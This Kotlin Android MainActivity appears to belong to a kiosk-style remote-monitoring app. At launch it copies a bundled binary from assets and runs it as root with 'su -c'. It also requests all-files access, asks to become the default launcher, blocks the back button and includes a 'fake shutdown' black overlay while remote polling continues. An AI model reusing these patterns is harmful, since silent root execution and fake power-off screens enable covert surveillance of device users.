
package com.example.myapplication

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Bundle
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.provider.Settings
import android.util.Log
import androidx.activity.OnBackPressedCallback
import androidx.activity.compose.BackHandler
import androidx.activity.result.ActivityResultLauncher
import androidx.compose.foundation.background
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.viewinterop.AndroidView
import androidx.navigation.compose.rememberNavController
import androidx.navigation.compose.NavHost
import androidx.navigation.compose.composable
import com.example.myapplication.ui.theme.MyApplicationTheme
import com.example.myapplication.utils.handleAppLaunchOrDownload
import com.example.myapplication.utils.startPolling
import java.io.File


class MainActivity : ComponentActivity() {
    private var packageNameToRequest: String? = null // 将 packageName 改为可空类型
    private lateinit var setDefaultLauncherLauncher: ActivityResultLauncher<Intent>

    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        permissions.entries.forEach { entry ->
            val permissionName = entry.key
            val isGranted = entry.value
            if (isGranted) {
                Log.d(TAG, "$permissionName 权限被授予")
            } else {
                Log.d(TAG, "$permissionName 权限被拒绝")
            }
        }
        // 如果所有权限都已授予，继续下载逻辑
        if (permissions.values.all { it }) {
            packageNameToRequest?.let { packageName ->
                Log.d(TAG, "所有权限已授予，准备处理应用启动或下载: $packageName")
                handleAppLaunchOrDownload(this, packageName)
            } ?: run {
                Log.e(TAG, "packageName 尚未被初始化")
            }
        } else {
            Log.e(TAG, "未授予所有权限，无法继续处理")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // 确保在调用任何其他方法之前初始化 setDefaultLauncherLauncher
        setDefaultLauncherLauncher = registerForActivityResult(
            ActivityResultContracts.StartActivityForResult()
        ) { result ->
            if (result.resultCode == RESULT_OK) {
                Log.d(TAG, "用户已将应用设置为默认桌面")
            } else {
                Log.d(TAG, "用户未将应用设置为默认桌面")
            }
        }

        Log.d(TAG, "onCreate: 创建活动")
        setContent {
            MyApplicationTheme {
                MainScreenWithRemoteMonitor()
            }
        }

        executeBinary(this) // 尝试在启动时执行二进制文件

        Log.d(TAG, "onCreate: 初始化 Activity 结束")
    }

    override fun onStart() {
        super.onStart()
        Log.d(TAG, "onStart: 开始执行")
        checkAndRequestPermissions()
        checkAndRequestDefaultLauncher()
    }

    private fun checkAndRequestPermissions() {
        Log.d(TAG, "requestPermissions: 请求权限")

        val permissions = mutableListOf<String>()

        // 针对 Android 13 及以上（Tiramisu，API 33）
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
            permissions.add(Manifest.permission.READ_MEDIA_AUDIO)
            permissions.add(Manifest.permission.READ_MEDIA_VIDEO)
        }
        // 针对 Android 10 - 12（API 29 至 32）
        else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        // 针对 Android 9 及以下（API 28 及以下）
        else {
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }

        // 如果是 Android 11 及以上，并且没有 MANAGE_EXTERNAL_STORAGE 权限，可以请求该权限
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                // 检查设备是否支持该 Intent
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                intent.data = Uri.parse("package:$packageName")
                if (intent.resolveActivity(packageManager) != null) {
                    // 请求 MANAGE_EXTERNAL_STORAGE 权限
                    startActivityForResult(intent, 123) // 使用 startActivityForResult 或类似的方法进行请求
                } else {
                    Log.e(TAG, "无法找到处理 MANAGE_APP_ALL_FILES_ACCESS_PERMISSION 的 Activity")
                }
            }
        }

        // 如果有需要的权限，发起请求
        if (permissions.isNotEmpty()) {
            requestPermissionLauncher.launch(permissions.toTypedArray())
        }
    }

    private fun checkAndRequestDefaultLauncher() {
        Log.d(TAG, "checkAndRequestDefaultLauncher: 检查并请求默认桌面")

        if (!isMyAppLauncherDefault()) {
            // 请求用户将应用设置为默认桌面
            Log.d(TAG, "应用不是默认桌面，请求设置为默认桌面")
            requestSetDefaultLauncher()
        } else {
            Log.d(TAG, "应用已是默认桌面")
        }
    }

    private fun isMyAppLauncherDefault(): Boolean {
        val intent = Intent(Intent.ACTION_MAIN)
        intent.addCategory(Intent.CATEGORY_HOME)
        val resolveInfo = packageManager.resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY)
        val isDefault = resolveInfo?.activityInfo?.packageName == packageName
        Log.d(TAG, "isMyAppLauncherDefault: $isDefault")
        return isDefault
    }

    private fun requestSetDefaultLauncher() {
        val intent = Intent(Intent.ACTION_MAIN)
        intent.addCategory(Intent.CATEGORY_HOME)
        intent.addCategory(Intent.CATEGORY_DEFAULT)
        Log.d(TAG, "启动设置默认桌面界面")
        startActivityForResult(intent, 123)
    }

    // 从 Assets 复制二进制文件到应用目录
    private fun copyBinaryFromAssets(context: Context): Boolean {
        Log.d(TAG, "开始从 Assets 复制二进制文件")
        val assetManager = context.assets
        val binaryFile = File(context.filesDir, "snclient_android_arm64")

        if (binaryFile.exists()) {
            Log.d(TAG, "二进制文件已存在: ${binaryFile.absolutePath}")
            return true
        }

        return try {
            Log.d(TAG, "二进制文件不存在，开始复制")
            assetManager.open("snclient_android_arm64").use { inputStream ->
                binaryFile.outputStream().use { outputStream ->
                    inputStream.copyTo(outputStream)
                }
            }
            Log.d(TAG, "复制完成，设置执行权限")
            binaryFile.setExecutable(true, false)
            Log.d(TAG, "设置执行权限成功")
            true
        } catch (e: Exception) {
            Log.e(TAG, "复制二进制文件失败", e)
            false
        }
    }

    // 执行二进制文件
    private fun executeBinary(context: Context): String {
        Log.d(TAG, "开始执行二进制文件")
        if (!copyBinaryFromAssets(context)) {
            Log.e(TAG, "二进制文件复制失败")
            return "二进制文件复制失败"
        }

        val binaryFile = File(context.filesDir, "snclient_android_arm64")
        if (!binaryFile.canExecute()) {
            Log.e(TAG, "二进制文件不可执行: ${binaryFile.absolutePath}")
            return "二进制文件不可执行"
        }

        val command = listOf("su", "-c", binaryFile.absolutePath)
        Log.d(TAG, "构建命令: ${command.joinToString(" ")}")
        return try {
            Log.d(TAG, "启动 ProcessBuilder")
            val process = ProcessBuilder(command).redirectErrorStream(true).start()
            Log.d(TAG, "ProcessBuilder 启动成功，等待输出")

            val output = process.inputStream.bufferedReader().readText()
            Log.d(TAG, "读取输出完成")
            val exitCode = process.waitFor()
            Log.d(TAG, "命令执行完成，退出码：$exitCode")

            Log.d(TAG, "输出内容：$output")
            output
        } catch (e: Exception) {
            Log.e(TAG, "执行二进制文件出错", e)
            "执行出错: ${e.message}"
        }
    }



    companion object {
        private const val TAG = "MainActivity"
    }

}



@Composable
fun MainScreenWithRemoteMonitor() {
    val navController = rememberNavController()
    val context = LocalContext.current
    val isScreenOff = remember { mutableStateOf(false) }
    val currentScreen = remember { mutableStateOf("mainscreen") }

    // 创建一个 OnBackPressedCallback 来处理返回键事件
    val backCallback = remember {
        object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                if (isScreenOff.value || currentScreen.value == "mainscreen") {
                    // 在假关机状态或 mainscreen 状态下拦截返回键事件
                    println("返回键无效")
                    Log.d("MainScreenWithRemoteMonitor", "返回键无效")
                } else {
                    navController.popBackStack()
                    Log.d("MainScreenWithRemoteMonitor", "返回到上一个屏幕")
                }
            }
        }
    }

    BackHandler(enabled = true, onBack = {
        backCallback.handleOnBackPressed()
    })

    Box(
        modifier = Modifier
            .fillMaxSize()
    ) {
        NavHost(navController = navController, startDestination = "mainscreen") {
            composable("mainscreen") {
                currentScreen.value = "mainscreen"
                Log.d("MainScreenWithRemoteMonitor", "导航到 mainscreen")
                mainscreen(navController)
            }
            composable("newScreen") {
                currentScreen.value = "newScreen"
                Log.d("MainScreenWithRemoteMonitor", "导航到 newscreen")
                newscreen(navController)
            }
        }
        if (isScreenOff.value) {
            // 显示黑色覆盖层
            Box(
                modifier = Modifier
                    .fillMaxSize()
                    .background(Color.Black)
            )
            Log.d("MainScreenWithRemoteMonitor", "假关机模式激活")
        } else {
            Log.d("MainScreenWithRemoteMonitor", "假关机模式未激活")
        }
        startPolling(context)
        AndroidView(
            modifier = Modifier
                .fillMaxSize(),
            factory = { context ->
                remotemonitor(
                    context,
                    onFakeShutDown = {
                        isScreenOff.value = true
                        Log.d("MainScreenWithRemoteMonitor", "进入假关机模式")
                    },
                    onWakeUpScreen = {
                        isScreenOff.value = false
                        Log.d("MainScreenWithRemoteMonitor", "退出假关机模式")
                    },
                    currentScreen = currentScreen
                ).apply {
                }
            }
        )
    }
}








